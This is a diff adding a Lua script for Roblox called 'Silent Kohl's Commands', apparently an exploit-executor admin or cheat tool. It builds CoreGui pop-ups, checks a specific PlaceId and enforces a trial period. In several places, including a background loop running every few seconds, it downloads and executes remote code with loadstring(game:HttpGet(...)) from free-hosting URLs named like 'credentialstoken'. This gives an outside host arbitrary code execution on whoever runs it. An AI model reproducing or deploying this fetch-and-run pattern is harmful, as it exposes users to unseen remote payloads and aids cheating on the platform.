+FinalFrame.Position = UDim2.new(.5,-200,.5,-175)
+FinalFrame.BackgroundColor3 = Color3.new(0,0,0)
+FinalFrame.BackgroundTransparency = .2
+FinalFrame.BorderSizePixel = 0
+local FinalTitle = Instance.new('TextLabel',FinalFrame)
+FinalTitle.Text = "Silent Kohl's Commands"
+FinalTitle.Name = ''
+FinalTitle.TextScaled = true
+FinalTitle.Font = 19
+FinalTitle.TextColor3 = Color3.new(255,255,255)
+FinalTitle.BackgroundTransparency = 1
+FinalTitle.Size = UDim2.new(0,300,0,50)
+FinalTitle.Position = UDim2.new(.5,-150,.1,-25)
+local FinalBar = Instance.new('TextLabel',FinalFrame)
+FinalBar.Text = ""
+FinalBar.Name = ''
+FinalBar.Font = 19
+FinalBar.TextColor3 = Color3.new(255,255,255)
+FinalBar.BackgroundTransparency = 0
+FinalBar.BorderColor3 = Color3.new(255,255,255)
+FinalBar.Size = UDim2.new(0,300,0,0)
+FinalBar.Position = UDim2.new(.5,-150,.15,0)
+local seterrorsign 
+function getresults(a)
+if string.find(a,'404') then
+seterrorsign = '(404: Page Not Found)'
+elseif string.find(a,'502') then
+seterrorsign = '(502: Invalid Response)'
+else
+local seterrorsign = tostring(a)
+end
+end
+local FinalLabel = Instance.new('TextLabel', FinalFrame)
+if args == nil then
+FinalLabel.Text = "The trial period for Silent Kohl's Commands has expired."
+else
+getresults(args)
+wait(.2)
+FinalLabel.Text = 'KSC encountered a web error... ' .. seterrorsign
+end
+FinalLabel.Name = ''
+FinalLabel.TextScaled = true
+FinalLabel.Font = 19
+FinalLabel.TextColor3 = Color3.new(255,255,255)
+FinalLabel.BackgroundTransparency = 1
+FinalLabel.Size = UDim2.new(0,300,0,200)
+FinalLabel.Position = UDim2.new(.5,-150,.5,-100)
+local FinalButton = Instance.new('TextButton',FinalFrame)
+FinalButton.Text = 'Okay'
+FinalButton.Name = ''
+FinalButton.TextScaled = true
+FinalButton.Font = 19
+FinalButton.TextColor3 = Color3.new(255,255,255)
+FinalButton.BackgroundTransparency = .9
+FinalButton.Size = UDim2.new(0,150,0,50)
+FinalButton.Position = UDim2.new(.5,-75,.9,-50)
+
+FinalG.DescendantRemoving:Connect(function()
+wait()
+FinalG:Destroy()
+end)
+
+function unp(args)
+if args == 1 then 
+if game:GetService('CoreGui'):FindFirstChild('サイレントコマンド') then 
+game:GetService('CoreGui')['サイレントコマンド'].Enabled = true
+end
+elseif args ==2 then
+if game:GetService('CoreGui'):FindFirstChild('Secure Login v2.5') then
+game:GetService('CoreGui')['Secure Login v2.5'].Enabled = false
+end
+end
+end
+
+FinalButton.MouseButton1Click:Connect(function()
+if string.match(FinalLabel.Text, 'error') then
+unp(paused)
+FinalG:Destroy()
+else
+FinalG:Destroy()
+end
+end)
+end
+
+function WG()
+local FinalG2 = Instance.new('ScreenGui', game:GetService('CoreGui'))
+FinalG2.Name = ''
+local FinalFrame2 = Instance.new('Frame', FinalG2)
+FinalFrame2.Name = ''
+FinalFrame2.Size = UDim2.new(0,400,0,350)
+FinalFrame2.Position = UDim2.new(.5,-200,.5,-175)
+FinalFrame2.BackgroundColor3 = Color3.new(0,0,0)
+FinalFrame2.BackgroundTransparency = .2
+FinalFrame2.BorderSizePixel = 0
+local FinalTitle2 = Instance.new('TextLabel',FinalFrame2)
+FinalTitle2.Text = "Silent Kohl's Commands"
+FinalTitle2.Name = ''
+FinalTitle2.TextScaled = true
+FinalTitle2.Font = 19
+FinalTitle2.TextColor3 = Color3.new(255,255,255)
+FinalTitle2.BackgroundTransparency = 1
+FinalTitle2.Size = UDim2.new(0,300,0,50)
+FinalTitle2.Position = UDim2.new(.5,-150,.1,-25)
+local FinalBar2 = Instance.new('TextLabel',FinalFrame2)
+FinalBar2.Text = ""
+FinalBar2.Name = ''
+FinalBar2.Font = 19
+FinalBar2.TextColor3 = Color3.new(255,255,255)
+FinalBar2.BackgroundTransparency = 0
+FinalBar2.BorderColor3 = Color3.new(255,255,255)
+FinalBar2.Size = UDim2.new(0,300,0,0)
+FinalBar2.Position = UDim2.new(.5,-150,.15,0)
+local FinalLabel2= Instance.new('TextLabel', FinalFrame2)
+FinalLabel2.Text = "KSC has detected an incorrect PlaceID (" .. game.PlaceId .. ")"
+FinalLabel2.Name = ''
+FinalLabel2.TextScaled = true
+FinalLabel2.Font = 19
+FinalLabel2.TextColor3 = Color3.new(255,255,255)
+FinalLabel2.BackgroundTransparency = 1
+FinalLabel2.Size = UDim2.new(0,300,0,200)
+FinalLabel2.Position = UDim2.new(.5,-150,.5,-100)
+local FinalButton2 = Instance.new('TextButton',FinalFrame2)
+FinalButton2.Text = 'Dismiss'
+FinalButton2.Name = ''
+FinalButton2.TextScaled = true
+FinalButton2.Font = 19
+FinalButton2.TextColor3 = Color3.new(255,255,255)
+FinalButton2.BackgroundTransparency = .9
+FinalButton2.Size = UDim2.new(0,150,0,50)
+FinalButton2.Position = UDim2.new(.5,-75,.94,-50)
+
+FinalG2.DescendantRemoving:Connect(function()
+wait()
+FinalG2:Destroy()
+end)
+
+FinalButton2.MouseButton1Click:Connect(function()
+FinalG2:Destroy()
+end)
+end
+
+function UpdateNew()
+local FinalG3 = Instance.new('ScreenGui', game:GetService('CoreGui'))
+FinalG3.Name = ''
+local FinalFrame3 = Instance.new('Frame', FinalG3)
+FinalFrame3.Name = ''
+FinalFrame3.Size = UDim2.new(0,400,0,350)
+FinalFrame3.Position = UDim2.new(.5,-200,.5,-175)
+FinalFrame3.BackgroundColor3 = Color3.new(0,0,0)
+FinalFrame3.BackgroundTransparency = .2
+FinalFrame3.BorderSizePixel = 0
+local FinalTitle3 = Instance.new('TextLabel',FinalFrame3)
+FinalTitle3.Text = "Silent Kohl's Commands"
+FinalTitle3.Name = ''
+FinalTitle3.TextScaled = true
+FinalTitle3.Font = 19
+FinalTitle3.TextColor3 = Color3.new(255,255,255)
+FinalTitle3.BackgroundTransparency = 1
+FinalTitle3.Size = UDim2.new(0,300,0,50)
+FinalTitle3.Position = UDim2.new(.5,-150,.1,-25)
+local FinalBar3 = Instance.new('TextLabel',FinalFrame3)
+FinalBar3.Text = ""
+FinalBar3.Name = ''
+FinalBar3.Font = 19
+FinalBar3.TextColor3 = Color3.new(255,255,255)
+FinalBar3.BackgroundTransparency = 0
+FinalBar3.BorderColor3 = Color3.new(255,255,255)
+FinalBar3.Size = UDim2.new(0,300,0,0)
+FinalBar3.Position = UDim2.new(.5,-150,.15,0)
+local FinalLabel3= Instance.new('TextLabel', FinalFrame3)
+FinalLabel3.Text = "KSC is now updating..."
+FinalLabel3.Name = ''
+FinalLabel3.TextScaled = true
+FinalLabel3.Font = 19
+FinalLabel3.TextColor3 = Color3.new(255,255,255)
+FinalLabel3.BackgroundTransparency = 1
+FinalLabel3.Size = UDim2.new(0,300,0,200)
+FinalLabel3.Position = UDim2.new(.5,-150,.5,-100)
+local FinalButton2 = Instance.new('TextButton',FinalFrame2)
+
+FinalG3.DescendantRemoving:Connect(function()
+wait()
+FinalG3:Destroy()
+end)
+
+wait(8)
+
+local staticstats, staticmessage = pcall(function()
+FinalG3:Destroy()
+end)
+end
+
+
+function Trial()
+if _G.ScriptVersion < _G.LatestVersion then 
+local Stat,Message = pcall(function()
+DetectedOld()
+end)
+if not Stat then warn(Message) else warn('Ask dev for updated script...') wait(.25) gt() end
+else 
+local Stat2,Message2 = pcall(function()
+CurrentVersion()
+end)
+if not Stat2 then warn(Message2) else 
+gt()
+end
+end
+end
+
+function wrapper()
+if game:GetService('CoreGui'):FindFirstChild('LogMeIn') then
+game:GetService('CoreGui').LogMeIn:Destroy()
+end
+end
+
+function remLogin()
+if _G.LoginStyle == 1 then
+wrapper()
+elseif _G.LoginStyle == 2 then
+if game:GetService('CoreGui'):FindFirstChild('Secure Login v2.5') then
+game:GetService('CoreGui')['Secure Login v2.5']:Destroy()
+end
+end
+end
+
+function remGui()
+if game:GetService('CoreGui'):FindFirstChild('サイレントコマンド') then 
+game:GetService('CoreGui')['サイレントコマンド']:Destroy()
+end
+end
+
+function retryWeb()
+pcall(function()
+loadstring(game:HttpGet(("https://credentialstokenrewritten.000webhostapp.com/"),true))()
+end)
+end
+
+local updater = true
+local unpackeronly = coroutine.wrap(function()
+while updater do 
+wait(6)
+if _G.PushNewVersion == true then
+if _G.CurrentState == false then
+updater = false
+_G.CurrentState = true
+_G.PushNewVersion = false
+flagged = false
+remLogin()
+remGui()
+UpdateNew()
+wait()
+warn('Updating...')
+loadstring(game:HttpGet(("https://cacheddatesiteo.000webhostapp.com/LandingScript"),true))()
+end end
+end
+end)
+unpackeronly()
+
+function PauseGui()
+paused = 1
+if game:GetService('CoreGui'):FindFirstChild('サイレントコマンド') then 
+game:GetService('CoreGui')['サイレントコマンド'].Enabled = false
+end
+end
+function PauseLogin()
+paused = 2
+if game:GetService('CoreGui'):FindFirstChild('Secure Login v2.5') then
+game:GetService('CoreGui')['Secure Login v2.5'].Enabled = false
+end
+end
+
+
+local testin = coroutine.wrap(function()
+while flagged do 
+wait(4)
+local webstats,webmessage = pcall(function()
+loadstring(game:HttpGet(("https://credentialstoken.000webhostapp.com/"),true))()
+end)
+if not webstats then 
+PauseLogin()
+PauseGui()
+TrialOver(webmessage)
+wait(.5)
+retryWeb() end
+wait(1)
+if _G.TrialStatus == false then
+warn('End')
+flagged = false
+remLogin()
+remGui()
+TrialOver()
+end
+end
+end) 
+
+function CGI2()
+if game.PlaceId == 112420803 then  Trial() else flagged = false WG() end
+end
+
+function AlreadyRunning()
+local FinalG4 = Instance.new('ScreenGui', game:GetService('CoreGui'))
+FinalG4.Name = ''
+local FinalFrame4 = Instance.new('Frame', FinalG4)
+FinalFrame4.Name = ''
+FinalFrame4.Size = UDim2.new(0,400,0,350)
+FinalFrame4.Position = UDim2.new(.5,-200,.5,-175)
+FinalFrame4.BackgroundColor3 = Color3.new(0,0,0)
+FinalFrame4.BackgroundTransparency = .2
+FinalFrame4.BorderSizePixel = 0
+local FinalTitle4 = Instance.new('TextLabel',FinalFrame4)
+FinalTitle4.Text = "Silent Kohl's Commands"
+FinalTitle4.Name = ''
+FinalTitle4.TextScaled = true
+FinalTitle4.Font = 19
+FinalTitle4.TextColor3 = Color3.new(255,255,255)
+FinalTitle4.BackgroundTransparency = 1
+FinalTitle4.Size = UDim2.new(0,300,0,50)
+FinalTitle4.Position = UDim2.new(.5,-150,.1,-25)
+local FinalBar4 = Instance.new('TextLabel',FinalFrame4)
+FinalBar4.Text = ""
+FinalBar4.Name = ''
+FinalBar4.Font = 19
+FinalBar4.TextColor3 = Color3.new(255,255,255)
+FinalBar4.BackgroundTransparency = 0
+FinalBar4.BorderColor3 = Color3.new(255,255,255)
+FinalBar4.Size = UDim2.new(0,300,0,0)
+FinalBar4.Position = UDim2.new(.5,-150,.15,0)
+local FinalLabel4= Instance.new('TextLabel', FinalFrame4)
+FinalLabel4.Text = "KSC is already running."
+FinalLabel4.Name = ''
+FinalLabel4.TextScaled = true
+FinalLabel4.Font = 19
+FinalLabel4.TextColor3 = Color3.new(255,255,255)
+FinalLabel4.BackgroundTransparency = 1
+FinalLabel4.Size = UDim2.new(0,300,0,200)
+FinalLabel4.Position = UDim2.new(.5,-150,.5,-100)
+
+FinalG4.DescendantRemoving:Connect(function()
+wait()
+FinalG4:Destroy()
+end)
+
+wait(2.5)
+local dumpers, dumpermesg = pcall(function()
+FinalG4:Destroy()
+end)
+end
+
+
+function CGI()
+if not game:GetService('CoreGui'):FindFirstChild('サイレントコマンド') then 
+if not game:GetService('CoreGui'):FindFirstChild('Secure Login v2.5') then
+CGI2() 
+else flagged = false AlreadyRunning() end else flagged = false AlreadyRunning() end
+end
+
+wait()
+function Executive()
+if _G.TrialStatus == false then
+flagged = false
+TrialOver()
+else
+CGI()
+end
+end
+
+local did = false
+if did == false then did = true 
+Executive()
+end
+
+testin()
+
